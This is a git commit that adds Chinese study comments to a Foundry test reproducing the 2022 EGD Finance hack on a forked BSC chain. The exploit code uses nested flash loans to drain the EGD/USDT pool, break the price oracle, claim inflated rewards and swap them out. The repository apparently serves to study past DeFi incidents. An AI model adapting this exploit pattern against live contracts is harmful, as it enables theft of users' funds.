3eaa9548e8699bd09f72212b1313f02713ae8d09
Money Orientation Programming <zeroonechange@gmail.com>
2023-03-23 00:22:27 +0800

    EGD Finance  攻击始末

--- contract/security/DeFiHackLabs/attack_code/test/EGD_exp.t.sol
+++ contract/security/DeFiHackLabs/attack_code/test/EGD_exp.t.sol
@@ -62,9 +62,9 @@ address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;
 
 contract Attacker is Test {
     function setUp() public {
-        vm.createSelectFork("https://bsc-dataseed4.defibit.io/", 20_245_522);
+        vm.createSelectFork("https://bsc-dataseed4.defibit.io/", 20_245_522);    // 设置链 和 历史区块 
 
-        vm.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
+        vm.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");  // 用于区分 
         vm.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
         vm.label(address(pancakeRouter), "pancakeRouter");
         vm.label(EGD_Finance, "EGD_Finance");
@@ -79,8 +79,8 @@ contract Attacker is Test {
         console.log("Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8");
         console.log("Attacker Stake 100 USDT to EGD Finance");
 
-        exploit.stake();
-        vm.warp(1659914146); // block.timestamp = 2022-08-07 23:15:46(UTC)
+        exploit.stake();         // 质押 
+        vm.warp(1659914146); // block.timestamp = 2022-08-07 23:15:46(UTC)  调整区块时间  
 
         console.log("-------------------------------- Start Exploit ----------------------------------");
         emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
@@ -88,7 +88,7 @@ contract Attacker is Test {
         emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);
         console.log("Attacker manipulating price oracle of EGD Finance...");
 
-        exploit.harvest();
+        exploit.harvest();    // 收割
 
         console.log("-------------------------------- End Exploit ----------------------------------");
         emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
@@ -102,19 +102,19 @@ contract Exploit is Test {
 
     function stake() public {
         // Give exploit contract 100 USDT
-        deal(address(usdt), address(this), 100 ether);
+        deal(address(usdt), address(this), 100 ether);     // 设定钱包余额 
         // Set invitor
         IEGD_Finance(EGD_Finance).bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));
         // Stake 100 USDT
-        IERC20(usdt).approve(EGD_Finance, 100 ether);
-        IEGD_Finance(EGD_Finance).stake(100 ether);
+        IERC20(usdt).approve(EGD_Finance, 100 ether);   // 常用套路  ERC-20 批准    后面的人就可以使用这笔资金  
+        IEGD_Finance(EGD_Finance).stake(100 ether);     
     }
 
     function harvest() public {
         console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
-        borrow1 = 2000 * 1e18;
-        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
-        console.log("Flashloan[1] payback success");
+        borrow1 = 2000 * 1e18;                          
+        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");  // 去池子借 2000 USDT
+        console.log("Flashloan[1] payback success");  // 第一笔闪电贷完成后   把钱转给黑客地址 
         IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); // refund all USDT
     }
 
@@ -124,19 +124,19 @@ contract Exploit is Test {
 
             console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
             borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925 / 10_000_000_000; // Attacker borrow 99.99999925% USDT of EGD_USDT_LPPool reserve
-            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00");
-            console.log("Flashloan[2] payback success");
+            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00");  // 几乎抽干了 EGD_USDT 的池子 
+            console.log("Flashloan[2] payback success");   // 第二笔闪电贷还清了
 
             // Swap all egd -> usdt
             console.log("Swap the profit...");
             address[] memory path = new address[](2);
             path[0] = egd;
             path[1] = usdt;
-            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
+            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);   // 批准给 Pancake  准备把 EGD 换成 USDT  
             pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                 IERC20(egd).balanceOf(address(this)), 1, path, address(this), block.timestamp
             );
-
+            // 还掉第一笔闪电贷 
             bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); // Attacker payback 2,010 USDT (w/ 0.5% fee)
             require(suc, "Flashloan[1] payback failed");
         } else {
@@ -144,11 +144,11 @@ contract Exploit is Test {
             emit log_named_decimal_uint("[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
             // -----------------------------------------------------------------
             console.log("Claim all EGD Token reward from EGD Finance contract");
-            IEGD_Finance(EGD_Finance).claimAllReward();
+            IEGD_Finance(EGD_Finance).claimAllReward();      // 在池子被抽干的前提下  价格预言机不起作用了  这里面就能得到很多的 EGD token  
             emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
             // -----------------------------------------------------------------
             uint256 swapfee = amount1 * 3 / 1000; // Attacker pay 0.3% fee to Pancakeswap
-            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1 + swapfee);
+            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1 + swapfee);  // 这是第二次闪电贷  抽干了 EGD_USDT 的池子 的那一笔    还 USDT 
             require(suc, "Flashloan[2] payback failed");
         }
     }
